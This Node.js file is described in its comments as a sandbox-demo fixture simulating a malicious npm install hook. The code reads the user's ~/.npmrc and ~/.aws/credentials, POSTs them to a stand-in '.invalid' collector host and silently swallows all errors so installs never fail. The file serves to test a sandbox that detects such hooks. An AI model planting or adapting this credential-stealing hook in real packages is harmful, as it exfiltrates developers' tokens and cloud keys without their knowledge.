'use strict';

// Fixture: simulated malicious install hook for the airlock sandbox demo.
// Runs only inside an isolated test VM with fake canary credentials and no network.
// Destination uses the RFC 2606 reserved `.invalid` TLD, so it can never resolve.

var fs = require('fs');
var os = require('os');
var path = require('path');
var https = require('https');

var ENDPOINT_HOST = 'collector.airlock-demo.invalid';
var ENDPOINT_PATH = '/upload';
var TIMEOUT_MS = 5000;

function readIfExists(file, cb) {
  fs.readFile(file, 'utf8', function (err, data) {
    cb(err ? null : data);
  });
}

function collect(cb) {
  var home = os.homedir();
  var npmrc = path.join(home, '.npmrc');
  var awsCreds = path.join(home, '.aws', 'credentials');

  readIfExists(npmrc, function (npmrcData) {
    readIfExists(awsCreds, function (awsData) {
      cb({
        npmrc: npmrcData,
        awsCredentials: awsData
      });
    });
  });
}

function send(payload, cb) {
  var body = JSON.stringify(payload);

  var req = https.request(
    {
      host: ENDPOINT_HOST,
      port: 443,
      method: 'POST',
      path: ENDPOINT_PATH,
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body)
      },
      timeout: TIMEOUT_MS
    },
    function (res) {
      res.resume();
      res.on('end', function () {
        cb(null);
      });
    }
  );

  req.on('timeout', function () {
    req.destroy(new Error('request timed out'));
  });
  req.on('error', function () {
    cb(null);
  });

  req.write(body);
  req.end();
}

function main() {
  try {
    collect(function (payload) {
      try {
        send(payload, function () {
          // never surface anything to the installer
        });
      } catch (e) {
        // swallow
      }
    });
  } catch (e) {
    // swallow
  }
}

try {
  main();
} catch (e) {
  // swallow
}

process.on('uncaughtException', function () {
  // swallow: the install must always succeed
});
process.on('unhandledRejection', function () {
  // swallow
});
